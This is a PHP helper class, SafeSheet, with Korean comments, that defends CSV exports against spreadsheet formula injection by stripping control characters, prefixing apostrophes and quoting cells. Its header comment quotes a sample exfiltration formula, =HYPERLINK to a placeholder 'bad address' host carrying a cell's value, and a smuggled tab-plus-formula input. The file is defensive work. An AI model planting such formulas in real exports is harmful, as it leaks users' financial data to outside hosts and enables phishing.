<?php

namespace App\Support;

/**
 * ★ v18.67 보안 — 내보내기(CSV) 수식 주입 방지 공용 도우미
 *
 *   사용자가 쓴 글(일정 메모, 팀원 이름, 견적 항목명 등)이 = + - @ 로 시작하면
 *   엑셀·구글 시트가 CSV를 열 때 수식으로 실행할 수 있음(예: =HYPERLINK("http://나쁜주소/?"&C3) → 수입 숫자 유출·피싱 링크).
 *   - CSV:
 *     · 칸 안의 탭·줄바꿈(그 밖의 제어문자 포함)은 공백으로 바꿈. 앱은 CSV를 파일이 아니라 공유창 '글자'로 보내서
 *       받은 사람이 엑셀·구글 시트에 붙여넣으면 탭·줄바꿈 자리에서 칸·행이 나뉨 → 메모 가운데 "\t=1+1"이 새 칸 맨 앞이 됐었음.
 *     · 칸 맨 앞, 그리고 칸 안의 쉼표·세미콜론 바로 뒤(공백 건너뜀)가 = + - @ 이면 그 자리에 작은따옴표(')를 붙여 글자로 보이게 함
 *       (세미콜론을 목록 구분자로 쓰는 지역의 엑셀, '텍스트 나누기'로 쉼표·세미콜론에서 잘라도 새 칸이 수식이 되지 않게).
 *     · 쉼표·세미콜론·큰따옴표가 있으면 큰따옴표로 감쌈(RFC 4180).
 *     (예전엔 쉼표만 공백으로 바꿔서 메모 내용이 바뀌고, 수식은 그대로 들어갔음)
 *   - 엑셀(.xlsx): XlsxBuilder가 글자를 setValueExplicit(TYPE_STRING)로 써서 수식이 되지 않음 → 따옴표를 붙이면 오히려
 *     칸에 '가 그대로 보이므로 엑셀 쪽은 손대지 않음(정산표·견적서·세무 엑셀 모두 XlsxBuilder 사용).
 *     단, XlsxBuilder는 숫자처럼 보이는 글('1e999', '00123')을 숫자 칸으로 써서 파일이 깨지거나 글이 바뀌므로,
 *     사용자가 쓴 글 칸은 SafeSheet::text()로 감싸 넘겨 항상 글자 칸으로 쓰게 함(SheetText 참고).
 *   숫자(int·float·"-1500.00" 같은 숫자 문자열)는 수식이 될 수 없으니 그대로 둠 — 음수 금액이 '-1500 으로 바뀌지 않게.
 */
final class SafeSheet
{
    /**
     * 사용자가 쓴 글 칸 표시 — 엑셀(XlsxBuilder)에서 숫자처럼 보여도 항상 글자 칸으로 씀. CSV에선 그냥 글로 처리.
     *   null은 빈 글자.
     */
    public static function text(mixed $value): SheetText
    {
        return new SheetText($value === null ? '' : (string) $value);
    }

    /** CSV 칸 하나 — 제어문자 정리 + 수식 무력화 + 필요하면 큰따옴표로 감싸기 */
    public static function csvCell(mixed $value): string
    {
        if ($value === null) {
            return '';
        }
        if (is_bool($value)) {
            return $value ? '1' : '0';
        }
        if (is_int($value) || is_float($value)) {
            return (string) $value; // 진짜 숫자는 그대로
        }

        // (1) 탭·줄바꿈·그 밖의 제어문자 → 공백 (모두 1바이트라 UTF-8 한글을 깨지 않음)
        $s = preg_replace('/[\x00-\x1F\x7F]+/', ' ', (string) $value) ?? '';

        // (2) 칸 맨 앞 / 쉼표·세미콜론 바로 뒤(공백 건너뜀)가 = + - @ 이면 그 자리에 ' 를 붙임. 숫자 문자열은 그대로.
        if ($s !== '' && !is_numeric($s)) {
            $s = preg_replace('/(^|[,;])(?=[ ]*[=+\-@])/', "\$1'", $s) ?? $s;
        }

        // (3) 쉼표·세미콜론·큰따옴표가 있으면 큰따옴표로 감쌈
        if (strpbrk($s, ",;\"\r\n") !== false) {
            $s = '"' . str_replace('"', '""', $s) . '"';
        }

        return $s;
    }

    /** CSV 한 줄 */
    public static function csvLine(array $row): string
    {
        return implode(',', array_map([self::class, 'csvCell'], array_values($row)));
    }

    /**
     * 행 배열 → CSV 텍스트 (UTF-8 BOM 포함: 엑셀에서 한글 깨짐 방지)
     *   빈 배열 행은 빈 줄로 나감.
     */
    public static function csv(array $rows, bool $bom = true): string
    {
        $lines = array_map(fn($r) => self::csvLine((array) $r), $rows);

        return ($bom ? "\xEF\xBB\xBF" : '') . implode("\n", $lines);
    }
}
